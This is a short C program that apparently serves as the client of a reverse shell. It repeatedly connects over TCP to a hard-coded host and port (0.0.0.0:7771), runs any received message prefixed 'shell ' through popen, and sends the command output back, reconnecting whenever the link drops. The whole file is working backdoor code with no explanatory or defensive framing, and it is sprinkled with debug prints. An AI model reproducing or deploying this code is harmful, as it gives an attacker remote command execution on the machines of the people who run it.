#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdbool.h>
#include <stdlib.h>
char* shell(char* cmd){
  FILE *fp;
  char buff[1024] = "\0";
  char *res = NULL;
  size_t size = 0;
  fp = popen(cmd,"r");
  while(fgets(buff,sizeof(buff),fp)){
    size_t len = strlen(buff);
    char *new_res =  realloc(res,size+len+1);
    res = new_res;
    memcpy(res+size,buff,len);
    size += len;
    res[size] = '\0';
  }
  return res;
}
int main(){
    int sock, status;
    struct sockaddr_in addr;
    memset(&addr,0,sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(7771);
    inet_aton("0.0.0.0",&addr.sin_addr);
    connect_loop:
    while(1){
        sock = socket(AF_INET,SOCK_STREAM,0);
        if(sock == -1){
            perror("socket");
            continue;
        }

        status = connect(sock, (struct sockaddr *) &addr, sizeof(addr));
        if(status == 0){
          printf("Connetion!!!\n");
          break;
        }
        else{
          close(sock);
          continue;
        }
    }
    printf("HOOHO\n");
    char data[1024];
    while(1==1){
      memset(data,0,sizeof(data));
      status = recv(sock,data,sizeof(data)-1,0);
      if(status > 0){
        data[status] = '\0';
        if(strncmp(data,"shell ",6) == 0){
          char *out = shell(data+6);
          if(out){
            printf("Sending.....\n");
            size_t len = strlen(out);
            size_t sent = 0;
            while (sent< len){
              printf("ss\n");
              ssize_t n = send(sock,out+sent,len-sent,0);
              sent +=n;
            }
            free(out);

          }
        }
        else{
          printf("%s\n",data);
        }
      }
      else{
        printf("The server is offline!!\n");
        printf("%d",status);
        goto connect_loop;
      }
    }
    return 0;
}
